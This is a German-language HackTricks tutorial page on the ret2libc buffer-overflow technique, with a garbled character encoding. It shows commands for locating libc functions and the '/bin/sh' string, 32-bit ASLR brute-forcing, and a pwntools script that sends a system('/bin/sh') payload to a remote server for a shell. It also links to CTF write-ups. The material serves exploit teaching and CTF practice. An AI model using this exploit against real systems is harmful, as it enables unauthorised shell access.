# Ret2lib

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

## **Grundinformationen**

Die Essenz von **Ret2Libc** besteht darin, den Ausf√ºhrungsfluss eines verwundbaren Programms auf eine Funktion innerhalb einer gemeinsamen Bibliothek (z. B. **system**, **execve**, **strcpy**) umzuleiten, anstatt vom Angreifer bereitgestellten Shellcode auf dem Stack auszuf√ºhren. Der Angreifer erstellt ein Payload, das die R√ºcksprungadresse auf dem Stack so √§ndert, dass sie auf die gew√ºnschte Bibliotheksfunktion zeigt, w√§hrend auch sichergestellt wird, dass alle erforderlichen Argumente gem√§√ü der Aufrufkonvention korrekt eingerichtet sind.

### **Beispielschritte (vereinfacht)**

* Holen Sie sich die Adresse der aufzurufenden Funktion (z. B. system) und den Befehl, der aufgerufen werden soll (z. B. /bin/sh)
* Erzeugen Sie eine ROP-Kette, um das erste Argument, das auf die Befehlszeichenfolge zeigt, und den Ausf√ºhrungsfluss zur Funktion zu √ºbergeben

## Adressen finden

* Angenommen, die verwendete `libc` ist die von der aktuellen Maschine, k√∂nnen Sie herausfinden, wo sie im Speicher geladen wird mit:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Wenn Sie √ºberpr√ºfen m√∂chten, ob ASLR die Adresse von libc √§ndert, k√∂nnen Sie Folgendes tun:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Wenn die verwendete libc bekannt ist, ist es auch m√∂glich, den Offset zur `system`-Funktion mit:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Wenn die verwendete libc bekannt ist, ist es auch m√∂glich, den Offset zur Funktion des Strings `/bin/sh` mit:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Verwendung von gdb-peda / GEF

Wenn die verwendete libc bekannt ist, ist es auch m√∂glich, Peda oder GEF zu verwenden, um die Adresse der **system**-Funktion, der **exit**-Funktion und des Strings **`/bin/sh`** zu erhalten:
```bash
p system
p exit
find "/bin/sh"
```
### Verwendung von /proc/\<PID>/maps

Wenn der Prozess **Kinder** erstellt, jedes Mal, wenn Sie mit ihm sprechen (Netzwerkserver), versuchen Sie, diese Datei zu **lesen** (wahrscheinlich m√ºssen Sie root sein).

Hier k√∂nnen Sie **genau herausfinden, wo die libc im Prozess geladen ist** und **wo sie f√ºr jedes Kind des Prozesses geladen wird**.

![](<../../../.gitbook/assets/image (853).png>)

In diesem Fall ist sie bei **0xb75dc000** geladen (Dies wird die Basisadresse der libc sein)

## Unbekannte libc

Es k√∂nnte m√∂glich sein, dass Sie **nicht wissen, welche libc die Bin√§rdatei l√§dt** (weil sie sich m√∂glicherweise auf einem Server befindet, auf den Sie keinen Zugriff haben). In diesem Fall k√∂nnten Sie die Schwachstelle ausnutzen, um **einige Adressen zu leaken und herauszufinden, welche libc**-Bibliothek verwendet wird:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

Und Sie k√∂nnen eine pwntools-Vorlage daf√ºr finden in:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### Kenntnis der libc mit 2 Offsets

√úberpr√ºfen Sie die Seite [https://libc.blukat.me/](https://libc.blukat.me/) und verwenden Sie ein **paar Adressen** von Funktionen innerhalb der libc, um die **verwendete Version** herauszufinden.

## Umgehung von ASLR in 32 Bit

Diese Brute-Force-Angriffe sind **nur n√ºtzlich f√ºr 32-Bit-Systeme**.

* Wenn der Exploit lokal ist, k√∂nnen Sie versuchen, die Basisadresse der libc zu brute-forcen (n√ºtzlich f√ºr 32-Bit-Systeme):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Wenn Sie einen Remote-Server angreifen, k√∂nnten Sie versuchen, **die Adresse der `libc`-Funktion `usleep` zu brute-forcen**, indem Sie als Argument 10 √ºbergeben (zum Beispiel). Wenn der **Server irgendwann 10 Sekunden l√§nger f√ºr die Antwort ben√∂tigt**, haben Sie die Adresse dieser Funktion gefunden.

## One Gadget

F√ºhren Sie eine Shell aus, indem Sie einfach zu **einer** bestimmten **Adresse** in libc springen:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib Code Beispiel

In diesem Beispiel ist ASLR-Brute-Force im Code integriert und die verwundbare Bin√§rdatei befindet sich auf einem Remote-Server:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Code Beispiel

√úberpr√ºfen Sie das Beispiel von:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## ARM64 Ret2lib Beispiel

Im Fall von ARM64 springt die ret-Anweisung zu dem, worauf das x30-Register zeigt, und nicht zu dem, worauf das Stack-Register zeigt. Es ist also etwas komplizierter.

Auch in ARM64 f√ºhrt eine Anweisung das aus, was die Anweisung tut (es ist nicht m√∂glich, mitten in Anweisungen zu springen und sie in neue zu transformieren).

√úberpr√ºfen Sie das Beispiel von:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf (oder puts)

Dies erm√∂glicht es, **Informationen aus dem Prozess zu leaken**, indem `printf`/`puts` mit bestimmten Daten als Argument aufgerufen wird. Zum Beispiel wird das Einf√ºgen der Adresse von `puts` in die GOT in eine Ausf√ºhrung von `puts` die **Adresse von `puts` im Speicher leaken**.

## Ret2printf

Das bedeutet im Grunde, eine **Ret2lib auszunutzen, um sie in eine `printf`-Formatstrings-Schwachstelle zu verwandeln**, indem die `ret2lib` verwendet wird, um printf mit den Werten aufzurufen, um sie auszunutzen (klingt nutzlos, ist aber m√∂glich):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Weitere Beispiele & Referenzen

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, gegeben einen Leak zur Adresse einer Funktion in libc, unter Verwendung eines Gadgets
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 Bit, ASLR aktiviert, aber kein PIE, der erste Schritt ist, einen √úberlauf zu f√ºllen, bis zum Byte 0x00 des Canary, um dann puts aufzurufen und es zu leaken. Mit dem Canary wird ein ROP-Gadget erstellt, um puts aufzurufen, um die Adresse von puts aus der GOT zu leaken und dann ein ROP-Gadget, um `system('/bin/sh')` aufzurufen.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 Bit, ASLR aktiviert, kein Canary, Stack-Overflow in main von einer Kindfunktion. ROP-Gadget, um puts aufzurufen, um die Adresse von puts aus der GOT zu leaken und dann ein Gadget aufzurufen.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 Bit, kein PIE, kein Canary, kein RELRO, NX. Verwendet die write-Funktion, um die Adresse von write (libc) zu leaken und ruft ein Gadget auf.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* Verwendet einen Format-String, um das Canary vom Stack zu leaken und einen Buffer-Overflow, um in system (es ist in der GOT) mit der Adresse von `/bin/sh` aufzurufen.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 Bit, kein RELRO, kein Canary, NX, PIE. Missbraucht eine schlechte Indizierung, um Adressen von libc und Heap vom Stack zu leaken. Missbraucht den Buffer-Overflow, um ein Ret2lib aufzurufen, das `system('/bin/sh')` aufruft (die Heap-Adresse wird ben√∂tigt, um eine √úberpr√ºfung zu umgehen).

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
